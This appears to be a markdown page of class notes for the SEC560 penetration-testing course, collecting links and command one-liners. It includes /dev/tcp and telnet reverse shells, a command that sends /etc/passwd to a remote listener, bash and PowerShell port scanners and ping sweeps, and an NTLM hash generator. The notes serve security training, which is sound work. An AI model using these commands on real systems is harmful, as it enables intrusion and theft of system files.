# Resources referenced during SEC560 classes


## Day 2

### Neat things you can do with tcpdump

https://www.middlewareinventory.com/blog/tcpdump-capture-http-get-post-requests-apache-weblogic-websphere/


### Some fun with cowsay and lolcat (thanks to Jeff McJunkin):
    while true; clear; do echo "I'm a cow" | cowsay -f $(ls /usr/share/cowsay/cows/ | sort -R | head -n1) "I'm a cow" | lolcat -a; sleep 5; clear; done



### Netcat without netcat

Check for existence of similar tools:
Gnu Netcat
Ncat
Socat
Linkcat
Nc.py (sometimes called Pycat) http://atlas.r4780y.com/resources/atlasutils-2.2.5.tgz

#### /dev/tcp
File transfers:
Box 1: # nc -nlvp 4444
Box 2: $ cat /etc/passwd > /dev/tcp/10.0.0.1/4444

Reverse shell:
Box 1: # nc -nlvp 8080
Box 2: $ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

Port scanner ("Connection refused" means port is closed):
Single port:    $ echo > /dev/tcp/10.0.0.1/22
Multiple ports: $ port=1; while \[ $port –lt 1024 ]; do echo > /dev/tcp/\[IPaddr]/$port; \[ $? == 0 ] && echo $port "is open" >> /tmp/ports.txt; port=`expr $port + 1`; done


#### If /dev/tcp can't be used, try telnet
Reverse shell:
Box 1 (where you type commands):   # nc -nlvp 4444
Box 1 (where you view the output): # nc -nlvp 4445
Box 2: $ telnet 10.0.0.1 4444 | /bin/bash | telnet 10.0.0.1 4445



#### Powershell
Ping sweep:

    PS C:\> 1..255 | % {ping –n 1 10.10.10.$_ | sls ttl}
    1..255 | % {echo "10.10.10.$_"; ping -n 1 -w 100 10.10.10.$_ | select-string ttl}

Port scan:

    21..80 | % {echo $_; echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.1",$_)) “Port $_ is open" } 2>$null


## Day 5


Generate NTLM hash if you know the password:

    python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'


## After class is over

Build your own SEC560 lab environment:

10.10.10.5, 10.10.10.10, and 10.10.10.20 (the DC requires an additional step to promote it to a DC):
* https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/


## Install searchsploit on Slingshot
    sudo git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb
    sed 's|path_array+=(.*)|path_array+=("/opt/exploitdb")|g' /opt/exploitdb/.searchsploit_rc > ~/.searchsploit_rc
    sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit


## Credits
* Ed Skoudis
* http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
* egre55 and mrh4sh from hackthebox.eu
* Bryce from Australia
* Jeff McJunkin's great 560 class notes https://bit.ly/560notes
